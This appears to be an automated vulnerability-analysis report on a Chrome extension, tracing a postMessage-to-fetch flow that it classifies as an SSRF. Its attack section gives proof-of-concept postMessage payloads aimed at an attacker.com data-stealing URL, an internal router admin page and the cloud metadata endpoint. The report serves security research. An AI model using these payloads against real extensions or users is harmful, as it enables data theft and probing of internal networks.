# CoCo Analysis: oohoniicgoomojjcicpghihgkmngdboj

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/oohoniicgoomojjcicpghihgkmngdboj/opgen_generated_files/cs_0.js
Line 528 window.addEventListener("message", function (event) {
Line 543 chrome.runtime.sendMessage({ invokeURL: event.data.apiURL });
Line 544 chrome.runtime.sendMessage({ invokeURL: event.data.apiURL });

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/oohoniicgoomojjcicpghihgkmngdboj/opgen_generated_files/bg.js
Line 978 fetch(request["invokeURL"])

**Code:**

```javascript
// Content script (cs_0.js, lines 528-546)
window.addEventListener("message", function (event) {
  if (event.source !== window) return;
  onDidReceiveMessage(event);
});

async function onDidReceiveMessage(event) {
  if (event.data.type && event.data.type === "API_CALL_BACKGROUND") {
    chrome.runtime.sendMessage({ invokeURL: event.data.apiURL }); // ← attacker-controlled
  }
}

// Background script (bg.js, lines 976-1012)
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  if (Object.keys(request).includes("invokeURL")) {
    fetch(request["invokeURL"]) // ← SSRF: fetch to attacker-controlled URL
      .then((response) => response.json())
      .then((result) => {
        console.log(result);
        if (result.message) {
          if (result.message == "No records found for the given criteria.") {
            chrome.tabs.query(
              { active: true, currentWindow: true },
              function (tabs) {
                chrome.tabs.sendMessage(tabs[0].id, {
                  message: "apiResponse",
                  data: { endOfRecords: "true" },
                });
              }
            );
          }
        } else {
          chrome.tabs.query(
            { active: true, currentWindow: true },
            function (tabs) {
              chrome.tabs.sendMessage(tabs[0].id, {
                message: "apiResponse",
                data: result.data[0],
              });
            }
          );
        }
      })
      .catch((err) => {
        console.log(err);
      });

    return true; // Will respond asynchronously.
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// From any malicious webpage, inject the following into the page:
window.postMessage({
  type: "API_CALL_BACKGROUND",
  apiURL: "http://attacker.com/steal-data"
}, "*");

// Or to perform SSRF attacks on internal networks:
window.postMessage({
  type: "API_CALL_BACKGROUND",
  apiURL: "http://192.168.1.1/admin"
}, "*");

// Or to probe cloud metadata endpoints:
window.postMessage({
  type: "API_CALL_BACKGROUND",
  apiURL: "http://169.254.169.254/latest/meta-data/"
}, "*");
```

**Impact:** Server-Side Request Forgery (SSRF). An attacker can make the extension perform privileged cross-origin HTTP requests to any URL, including internal network resources, cloud metadata endpoints, or attacker-controlled servers. The extension has host permissions for all URLs (`<all_urls>`), allowing it to bypass the Same-Origin Policy and access internal networks, localhost services, and cloud metadata that would be inaccessible to normal web pages. The fetched data is sent back to the content script, allowing the attacker to receive responses from these privileged requests.
